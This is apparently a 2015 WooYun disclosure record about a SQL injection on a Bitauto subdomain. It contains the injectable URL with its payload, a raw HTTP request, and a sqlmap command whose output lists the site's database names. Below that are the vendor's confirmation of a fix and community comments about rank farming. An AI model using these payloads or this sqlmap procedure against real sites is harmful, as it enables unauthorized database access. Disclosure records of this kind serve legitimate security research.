{"id": 46356, "wybug_id": "wooyun-2015-091437", "wybug_title": "易车网某分站SQL注射4", "wybug_corp": "易车", "wybug_author": "今天明天", "wybug_date": "2015-01-12 17:46", "wybug_open_date": "2015-02-26 17:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： 易车网某分站SQL注射4 详细说明：  易车网某分站SQL注射4http://tuan.bitauto.com/ajax/getSearch/9%20%20AND%20version%28%29%3E0--/27159 的位置存在SQL注入   漏洞证明：  \nGET /ajax/getSearch/9 * /2715 HTTP/1.1Host: tuan.bitauto.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: sssConnection: keep-aliveCache-Control: max-age=0\n\nroot@bt5:/pentest/database/sqlmap# python sqlmap.py -r /1.txt --technique=B --string purchase_id --tamper charencode --dbs --threads 5    sqlmap/1.0-dev-25eca9d - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:41:52[17:41:52] [INFO] parsing HTTP request from '/1.txt'[17:41:52] [INFO] loading tamper script 'charencode'custom injection mark ('*') found in '-u'. Do you want to process it? [Y/n/q] y[17:41:54] [INFO] resuming back-end DBMS 'mysql' [17:41:54] [INFO] testing connection to the target url[17:41:54] [INFO] heuristics detected web page charset 'ascii'[17:41:54] [INFO] testing if the provided string is within the target URL page contentsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://tuan.bitauto.com:80/ajax/getSearch/9  AND 4516=4516 /2715---[17:41:55] [INFO] changes made by tampering scripts are not included in shown payload content(s)[17:41:55] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.9, Apache 2.2.23back-end DBMS: MySQL 5[17:41:55] [INFO] fetching database names[17:41:55] [INFO] fetching number of databases[17:41:55] [INFO] resumed: 3[17:41:55] [INFO] retrieving the length of query output[17:41:55] [INFO] retrieved: 18[17:41:59] [INFO] resuming partial value: 'i'[17:42:09] [INFO] retrieved: information_schema             [17:42:10] [INFO] retrieving the length of query output[17:42:09] [INFO] retrieved: 10[17:42:25] [INFO] retrieved: hd_huodong             [17:42:25] [INFO] retrieving the length of query output[17:42:25] [INFO] retrieved: 4[17:42:31] [INFO] retrieved: test           available databases [3]:[*] hd_huodong[*] information_schema[*] test[17:42:31] [INFO] fetched data logged to text files under '/pentest/database/sqlmap/output/tuan.bitauto.com'\n   修复方案：  过滤   版权声明：转载请注明来源 今天明天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-12 17:48 厂商回复： 非常感谢对易车的帮助，我们尽快修复 最新状态： 2015-01-13：漏洞已经修复，感谢对易车的关注  ", "replys": "漏洞评价：\n评论\n     2015-01-12 17:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  大哥带好头啊    \n     2015-01-12 17:49 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  提交时间：2015-01-12 17:46，确认时间：2015-01-12 17:48 ，洞主，你自己是厂商吗？    \n     2015-01-12 17:49 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  貌似今天带了波节奏    \n     2015-01-12 17:55 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  易车 & 21CN ，刷广告要交广告费的    \n     2015-01-12 18:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @玉林嘎 节奏要控制好啊 干嘛不打个包子啊    \n     2015-01-12 18:01 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  我就发了一个打包的 20rank    \n     2015-01-12 20:04 |    \t\t今天明天 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:10        | 今天明天)\t\t \n  打包的前提是同时发现，我是看到厂商确认那么快，是其它厂商不能做到的，才有兴趣再挖，你们都喜欢迟迟不确认的厂商？再说我提交的都是不同站点呀……这样也算刷rank我没话说……    \n     2015-01-22 22:11 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @玉林嘎 @今天明天 @xsser 这其实关系到哪两个利益，打包提交是关系到审核员和乌云的利益，而分开刷则是关系到白帽子的利益，人总是自私的，总是为自己的利益在思考，就像腾讯要大战360一样，同样是一个国家的企业，同是地球人为何要开战都是因为利益，很多同样是同行为什么之间要争吵大大出手出口呢？何不低调一笑而过，所以人类生活总是要为自己利益而想，要想做一个高雅的人，把世俗看透，把一切利益看透，回归真主，做个出家人，不为红尘而烦恼，不会权益而烦恼，低低调调做一个高雅的人~三位，要剃头吗？    \n     2015-02-02 09:07 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @U神 方丈 有礼了...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}